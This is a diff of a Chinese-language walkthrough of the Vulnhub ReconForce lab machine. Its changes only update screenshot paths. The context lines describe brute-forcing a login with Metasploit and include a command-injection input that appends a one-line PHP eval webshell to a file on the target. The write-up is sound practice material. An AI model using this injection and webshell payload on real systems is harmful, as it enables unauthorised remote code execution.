@@ -57,9 +57,9 @@ Task Completed
 
 那么访问主页。点击中间的TroubleShoot，会发现一个登录，并且URL变为```http://192.168.5.132/5ecure/```
 
-![image-20210917093327531](C:\Users\10607\AppData\Roaming\Typora\typora-user-images\image-20210917093327531.png)
+![image-20230628230938400](vulnhub靶机 ReconForce.assets\image-20230628230938400.png)
 
-![image-20210917101742393](C:\Users\10607\AppData\Roaming\Typora\typora-user-images\image-20210917101742393.png)
+![image-20230628231004177](vulnhub靶机 ReconForce.assets\image-20230628231004177.png)
 
 上面的文字为```is requesting your username and password. The site says: “Recon Security```
 
@@ -306,13 +306,13 @@ msf6 auxiliary(scanner/http/http_login) > exploit
 
 登录进去后发现可以命令执行
 
-![image-20210917113232578](C:\Users\10607\AppData\Roaming\Typora\typora-user-images\image-20210917113232578.png)
+![image-20230628231041967](vulnhub靶机 ReconForce.assets\image-20230628231041967.png)
 
-![image-20210917113245270](C:\Users\10607\AppData\Roaming\Typora\typora-user-images\image-20210917113245270.png)
+![image-20230628231103439](vulnhub靶机 ReconForce.assets\image-20230628231103439.png)
 
 使用burp suite 发送命令查看out.php
 
-![image-20210917113723514](C:\Users\10607\AppData\Roaming\Typora\typora-user-images\image-20210917113723514.png)
+![image-20230628231119740](vulnhub靶机 ReconForce.assets\image-20230628231119740.png)
 
 ```
 <?php
@@ -376,7 +376,7 @@ if( isset( $_POST[ 'Submit' ]  ) ) {
 
 直接写入一句话```127.0.0.1|echo "<?php @eval($_POST['qwer']);?>" >> php.php```
 
-![image-20210917140159617](C:\Users\10607\AppData\Roaming\Typora\typora-user-images\image-20210917140159617.png)
+![image-20230628231150995](vulnhub靶机 ReconForce.assets\image-20230628231150995.png)
 
 发现菜刀蚁剑等webshell无法连接
 
